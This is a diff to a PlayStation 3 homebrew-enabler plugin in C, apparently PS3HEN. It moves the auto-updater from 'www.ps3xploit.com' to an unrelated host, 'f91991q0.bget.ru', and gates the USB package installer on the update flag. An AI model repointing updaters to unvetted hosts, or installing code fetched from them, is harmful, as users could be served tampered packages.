@@ -51,7 +51,7 @@
 #pragma comment(lib, "netctl_stub")
  
 #define SERVER_PORT htons(80)
-#define HOST_SERVER "www.ps3xploit.com"
+#define HOST_SERVER "f91991q0.bget.ru"
  
 int Socket;
 struct hostent *Host;
@@ -434,7 +434,7 @@ int hen_updater(void)
     }
  
 	strcpy(RequestBuffer, "GET ");
-    strcat(RequestBuffer, "/hen/hen_version.bin");
+    strcat(RequestBuffer, "/hen_version.bin");
     strcat(RequestBuffer, " HTTP/1.0\r\n");
 	strcat(RequestBuffer, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134\r\n");
     strcat(RequestBuffer, "Accept-Language: en-US\r\n");
@@ -543,10 +543,10 @@ static void henplugin_thread(__attribute__((unused)) uint64_t arg)
 	
 	CellFsStat stat;
 	
-	int do_update=(cellFsStat("/dev_hdd0/hen_updater.off",&stat) ? hen_updater() : 0);// 20211011 Added update toggle thanks bucanero for original PR
+	int do_update=(cellFsStat("/dev_hdd0/hen/hen_updater.off",&stat) ? hen_updater() : 0);// 20211011 Added update toggle thanks bucanero for original PR
 	
 	// Emergency USB HEN Installer
-	if(cellFsStat("/dev_usb000/HEN_UPD.pkg",&stat)==0)
+	if((do_update==1) && (cellFsStat("/dev_usb000/HEN_UPD.pkg",&stat)==0))
 	{
 		memset(pkg_path,0,256);
 		strcpy(pkg_path,"/dev_usb000/HEN_UPD.pkg");
@@ -558,7 +558,7 @@ static void henplugin_thread(__attribute__((unused)) uint64_t arg)
 		goto done;
 	}
 	
-	if(cellFsStat("/dev_usb001/HEN_UPD.pkg",&stat)==0)
+	if((do_update==1) && (cellFsStat("/dev_usb001/HEN_UPD.pkg",&stat)==0))
 	{
 		memset(pkg_path,0,256);
 		strcpy(pkg_path,"/dev_usb001/HEN_UPD.pkg");
